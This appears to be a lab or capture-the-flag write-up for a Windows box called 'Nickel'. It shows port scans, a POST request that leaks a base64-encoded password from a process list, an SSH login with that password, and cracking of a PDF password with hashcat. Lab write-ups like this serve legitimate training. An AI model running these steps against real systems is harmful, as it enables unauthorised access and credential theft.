# Nickel
## Reconnaissance
### All port scanning
#### TCP
- `nmap -p- -T4 -sS --min-rate 1000 -oN Results_tcp.txt 192.168.217.99`
```sh
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-28 10:35 +0530
Nmap scan report for 192.168.215.99
Host is up (0.084s latency).
Not shown: 65519 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5040/tcp  open  unknown
7680/tcp  open  pando-pub
8089/tcp  open  unknown
33333/tcp open  dgi-serv
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 50.12 seconds
```
- `nmap  -Pn -A -p $PORTS -oN targeted_services.txt 192.168.217.99`
```sh
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-28 10:36 +0530
2026-07-28 10:39:44 read UDPv4 [EMSGSIZE Path-MTU=1480]: Message too long (fd=3,code=90)
Nmap scan report for 192.168.215.99
Host is up (0.10s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.60 beta
| ftp-syst:
|_  SYST: UNIX emulated by FileZilla
22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey:
|   3072 86:84:fd:d5:43:27:05:cf:a7:f2:e9:e2:75:70:d5:f3 (RSA)
|   256 9c:93:cf:48:a9:4e:70:f4:60:de:e1:a9:c2:c0:b6:ff (ECDSA)
|_  256 00:4e:d7:3b:0f:9f:e3:74:4d:04:99:0b:b1:8b:de:a5 (ED25519)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: NICKEL
|   NetBIOS_Domain_Name: NICKEL
|   NetBIOS_Computer_Name: NICKEL
|   DNS_Domain_Name: nickel
|   DNS_Computer_Name: nickel
|   Product_Version: 10.0.18362
|_  System_Time: 2026-07-28T05:09:45+00:00
| ssl-cert: Subject: commonName=nickel
| Not valid before: 2026-07-27T05:04:16
|_Not valid after:  2027-01-26T05:04:16
|_ssl-date: 2026-07-28T05:10:55+00:00; +1s from scanner time.
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8089/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Site doesn't have a title.
|_http-server-header: Microsoft-HTTPAPI/2.0
33333/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019|11|7|2008|8.1|XP (98%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_xp::sp3
Aggressive OS guesses: Microsoft Windows 10 1909 - 2004 (98%), Microsoft Windows 10 1709 - 22H2 (95%), Microsoft Windows 10 1909 (93%), Microsoft Windows Server 2019 (92%), Microsoft Windows 10 20H2 (90%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (90%), Microsoft Windows 11 24H2 (90%), Microsoft Windows 10 21H2 (90%), Microsoft Windows 10 1903 - 22H2 (89%), Microsoft Windows 11 24H2 - 25H2 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2026-07-28T05:09:47
|_  start_date: N/A

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   112.33 ms 192.168.45.1
2   112.26 ms 192.168.45.254
3   112.35 ms 192.168.251.1
4   112.43 ms 192.168.215.99

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 240.60 seconds
```
#### UDP
`nmap -sU -A --top-ports 20 192.168.217.99`
```sh
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-28 10:37 +0530
Nmap scan report for 192.168.215.99
Host is up (0.13s latency).

PORT      STATE         SERVICE      VERSION
53/udp    closed        domain
67/udp    closed        dhcps
68/udp    closed        dhcpc
69/udp    closed        tftp
123/udp   open|filtered ntp
135/udp   closed        msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   closed        netbios-ssn
161/udp   closed        snmp
162/udp   closed        snmptrap
445/udp   closed        microsoft-ds
500/udp   open|filtered isakmp
514/udp   closed        syslog
520/udp   closed        route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
49152/udp closed        unknown
Device type: general purpose
Running: Microsoft Windows 2008|2012|7|8.1|Vista, Novell NetWare 6.X
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista cpe:/o:novell:netware:6
Too many fingerprints match this host to give specific OS details
Network Distance: 4 hops

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   101.38 ms 192.168.45.1
2   101.28 ms 192.168.45.254
3   101.40 ms 192.168.251.1
4   101.49 ms 192.168.215.99

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 198.27 seconds
```
### Web
We can see there are 2 HTTP service running.

```sh
curl 192.168.215.99:8089
<h1>DevOps Dashboard</h1>
<hr>
<form action='http://169.254.144.247:33333/list-current-deployments' method='GET'>
<input type='submit' value='List Current Deployments'>
</form>
<br>
<form action='http://169.254.144.247:33333/list-running-procs' method='GET'>
<input type='submit' value='List Running Processes'>
</form>
<br>
<form action='http://169.254.144.247:33333/list-active-nodes' method='GET'>
<input type='submit' value='List Active Nodes'>
</form>
<hr>
curl http:/192.168.215.99:33333/list-current-deployments
<p>Cannot "GET" /list-current-deployments</p>
curl http://192.168.215.99:33333/list-running-procs
<p>Cannot "GET" /list-running-procs<p>                       
curl http://192.168.215.99:33333/list-active-nodes
<p>Cannot "GET" /list-active-nodes</p>
curl http://192.168.215.99:33333
Invalid Token

```
## Exploitation
```sh
curl http://192.168.236.99:33333/list-running-procs -X POST -H "Content-Length: 0"


name        : System Idle Process
commandline :

name        : System
commandline :

name        : Registry
commandline :

name        : smss.exe
commandline :

name        : csrss.exe
commandline :

name        : wininit.exe
commandline :

name        : csrss.exe
commandline :

name        : winlogon.exe
commandline : winlogon.exe

name        : services.exe
commandline :

name        : lsass.exe
commandline : C:\Windows\system32\lsass.exe

name        : fontdrvhost.exe
commandline : "fontdrvhost.exe"

name        : fontdrvhost.exe
commandline : "fontdrvhost.exe"

name        : dwm.exe
commandline : "dwm.exe"

name        : powershell.exe
commandline : powershell.exe -nop -ep bypass C:\windows\system32\ws80.ps1

name        : Memory Compression
commandline :

name        : cmd.exe
commandline : cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p
              "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh

name        : powershell.exe
commandline : powershell.exe -nop -ep bypass C:\windows\system32\ws8089.ps1

name        : powershell.exe
commandline : powershell.exe -nop -ep bypass C:\windows\system32\ws33333.ps1

name        : FileZilla Server.exe
commandline : "C:\Program Files (x86)\FileZilla Server\FileZilla Server.exe"

name        : sshd.exe
commandline : "C:\Program Files\OpenSSH\OpenSSH-Win64\sshd.exe"

name        : VGAuthService.exe
commandline : "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"

name        : vm3dservice.exe
commandline : C:\Windows\system32\vm3dservice.exe

name        : vmtoolsd.exe
commandline : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"

name        : vm3dservice.exe
commandline : vm3dservice.exe -n

name        : dllhost.exe
commandline : C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}

name        : WmiPrvSE.exe
commandline : C:\Windows\system32\wbem\wmiprvse.exe

name        : msdtc.exe
commandline : C:\Windows\System32\msdtc.exe

name        : LogonUI.exe
commandline : "LogonUI.exe" /flags:0x2 /state0:0xa3961855 /state1:0x41c64e6d

name        : conhost.exe
commandline : \??\C:\Windows\system32\conhost.exe 0x4

name        : conhost.exe
commandline : \??\C:\Windows\system32\conhost.exe 0x4

name        : conhost.exe
commandline : \??\C:\Windows\system32\conhost.exe 0x4

name        : conhost.exe
commandline : \??\C:\Windows\system32\conhost.exe 0x4

name        : MicrosoftEdgeUpdate.exe
commandline : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /c

name        : SgrmBroker.exe
commandline :

name        : SearchIndexer.exe
commandline : C:\Windows\system32\SearchIndexer.exe /Embedding

echo Tm93aXNlU2xvb3BUaGVvcnkxMzkK | base64 -d
NowiseSloopTheory139

ssh ariah@192.168.236.99
ariah@NICKEL C:\Users\ariah\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 9451-68F7

 Directory of C:\Users\ariah\Desktop

04/14/2022  04:46 AM    <DIR>          .
04/14/2022  04:46 AM    <DIR>          ..
08/03/2026  08:34 PM                34 local.txt
               1 File(s)             34 bytes
               2 Dir(s)   7,654,367,232 bytes free
```


### Privelage Escalation
```sh
ftp 192.168.236.99
Connected to 192.168.236.99.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
Name (192.168.236.99:G1): ariah
331 Password required for ariah
Password:
230 Logged on
Remote system type is UNIX.
Using binary mode to transfer files.


pdf2john Infrastructure.pdf > pdf_hash.txt

echo '$pdf$4*4*128*-1060*1*16*14350d814f7c974db9234e3e719e360b*32*6aa1a24681b93038947f76796470dbb100000000000000000000000000000000*32*d9363dc61ac080ac4b9dad4f036888567a2d468a6703faf6216af1eb307921b0' > pdf_hash.txt #(removing words before $)

hashcat pdf_hash.txt /usr/share/wordlists/rockyou.txt

$pdf$4*4*128*-1060*1*16*14350d814f7c974db9234e3e719e360b*32*6aa1a24681b93038947f76796470dbb100000000000000000000000000000000*32*d9363dc61ac080ac4b9dad4f036888567a2d468a6703faf6216af1eb307921b0:ariah4168
```

